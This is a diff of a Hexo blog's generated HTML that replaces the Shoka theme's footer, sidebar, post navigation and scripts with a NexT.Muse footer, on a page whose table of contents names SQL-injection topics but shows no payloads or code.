+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
   </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
 </div>
-
-      
-<div class="reward">
-  <button><i class="ic i-heartbeat"></i> Donate</button>
-  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
-  <div id="qr">
-      
-      <div>
-        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
-        <p>WeChat Pay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/alipay.png" alt="John Doe Alipay">
-        <p>Alipay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/paypal.png" alt="John Doe PayPal">
-        <p>PayPal</p>
-      </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-</div>
 
-      
-
-<div id="copyright">
-<ul>
-  <li class="author">
-    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
-  </li>
-  <li class="link">
-    <strong>Post link: </strong>
-    <a href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="sql注入总结">http://wscyoulin.github.io/2022/11/25/sql注入总结/</a>
-  </li>
-  <li class="license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
-  </li>
-</ul>
-</div>
-
+    </div>
   </footer>
 
-</article>
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-  </div>
   
 
-<div class="post-nav">
-    <div class="item left">
-      
 
-  <a href="/2022/11/19/buu-web/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhnx9glj20zk0m8npd.jpg" title="buu_web（21-xx)">
-  <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>buu_web（21-xx)</h3>
-  </a>
 
-    </div>
-    <div class="item right">
-      
 
-  <a href="/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhtuo6nj20zk0m8ttm.jpg" title="unlink复习">
-  <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>unlink复习</h3>
-  </a>
-
-    </div>
-</div>
 
   
-  <div class="wrap" id="comments"></div>
 
-
-        </div>
-        <div id="sidebar">
-          
-
-<div class="inner">
-
-  <div class="panels">
-    <div class="inner">
-      <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">2.</span> <span class="toc-text">绕过技巧</span></a></li></ol>
-      </div>
-      <div class="related panel pjax" data-title="Related">
-      </div>
-      <div class="overview panel" data-title="Overview">
-        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="image" itemprop="image" alt="John Doe"
-      data-src="/images/avatar.jpg">
-  <p class="name" itemprop="name">John Doe</p>
-  <div class="description" itemprop="description"></div>
-</div>
-
-<nav class="state">
-    <div class="item posts">
-      <a href="/archives/">
-        <span class="count">24</span>
-        <span class="name">posts</span>
-      </a>
-    </div>
-    <div class="item categories">
-      <a href="/categories/">
-        <span class="count">1</span>
-        <span class="name">categories</span>
-      </a>
-    </div>
-</nav>
-
-<div class="social">
-</div>
-
-<ul class="menu">
-  
-    
-  <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
-  </li>
-
-
-</ul>
-
-      </div>
-    </div>
-  </div>
-
-  <ul id="quick">
-    <li class="prev pjax">
-        <a href="/2022/11/19/buu-web/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
-    </li>
-    <li class="up"><i class="ic i-arrow-up"></i></li>
-    <li class="down"><i class="ic i-arrow-down"></i></li>
-    <li class="next pjax">
-        <a href="/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
-    </li>
-    <li class="percent"></li>
-  </ul>
-</div>
-
-
-        </div>
-        <div class="dimmer"></div>
-      </div>
-    </main>
-    <footer id="footer">
-      <div class="inner">
-        <div class="widgets">
-          
-<div class="rpost pjax">
-  <h2>Random Posts</h2>
-  <ul>
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" title="利用_IO_2_1_stdout泄露libc">利用_IO_2_1_stdout泄露libc</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="祥云杯复现">祥云杯复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/" title="buu_web（1-20）">buu_web（1-20）</a></span>
-  </li>
-
-  </ul>
-</div>
-<div>
-  <h2>Recent Comments</h2>
-  <ul class="leancloud-recent-comment"></ul>
-</div>
-
-        </div>
-        <div class="status">
-  <div class="copyright">
-    
-    &copy; 2010 – 
-    <span itemprop="copyrightYear">2022</span>
-    <span class="with-love">
-      <i class="ic i-sakura rotate"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">John Doe @ youlin</span>
-  </div>
-  <div class="powered-by">
-    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
-  </div>
-</div>
-
-      </div>
-    </footer>
-  </div>
-<script data-config type="text/javascript">
-  var LOCAL = {
-    path: '2022/11/25/sql注入总结/',
-    favicon: {
-      show: "（●´3｀●）Goooood",
-      hide: "(´Д｀)Booooom"
-    },
-    search : {
-      placeholder: "Search for Posts",
-      empty: "We didn't find any results for the search: ${query}",
-      stats: "${hits} results found in ${time} ms"
-    },
-    valine: true,fancybox: true,
-    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
-    ignores : [
-      function(uri) {
-        return uri.includes('#');
-      },
-      function(uri) {
-        return new RegExp(LOCAL.path+"$").test(uri);
-      }
-    ]
-  };
-</script>
-
-<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
-
-<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
-
-<script src="/js/app.js?v=0.2.5"></script>
 
 
 
